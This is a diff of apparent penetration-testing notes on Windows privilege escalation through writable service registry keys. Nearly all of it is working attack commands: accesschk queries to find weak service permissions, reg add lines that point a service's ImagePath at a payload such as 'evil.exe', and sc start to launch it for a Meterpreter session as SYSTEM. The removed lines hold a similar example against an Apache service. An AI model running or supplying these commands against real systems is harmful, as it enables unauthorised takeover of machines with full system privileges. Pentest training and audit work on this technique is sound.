@@ -1,31 +1,24 @@
 
 # Find writeable registry keys for services using Accesschk
-svch0st.exe -kwsu hostname\username hklm\system\currentcontrolset\services
+accesschk hostname\username -kwsuwq hklm\system\currentcontrolset\services
+accesschk Everyone -kwsuwq hklm\system\currentcontrolset\services
+accesschk "Authenticated Users" -kwsuwq hklm\system\currentcontrolset\services
+accesschk Users -kwsuwq hklm\system\currentcontrolset\services
+
+# check query value
+reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
 
 # change image path
-reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath \d "C:\temp\winlogon.exe"
+reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
 
-# restart the service
+# or use following command
+reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /t REG_EXPAND_SZ /v ImagePath /d "C:\temp\evil.exe" /f
+
+# restart the service and the custom payload will be executed instead of the service binary and it will 
+# return back a Meterpreter session as SYSTEM.
 sc start SomeSoftwareName
 
 
 ------------------------------------------------------------------------------------------------
 
-Registry keys for the services that are running on the system can be found in the following registry path:
-
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
-
-If a standard user has permissions to modify the registry key “ImagePath” which contains the path to the application binary 
-then he could escalate privileges to system as the Apache service is running under these privileges.
-
-C:\Users\pentestlab\Desktop>reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache"
-/t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\pentestlab2.exe" /f
- 
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache"
-/t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\pentestlab2.exe" /f
- 
-The operation completed successfully.
-
-The next time that the service will restart, the custom payload will be executed instead of the service binary and it will 
-return back a Meterpreter session as SYSTEM.
 
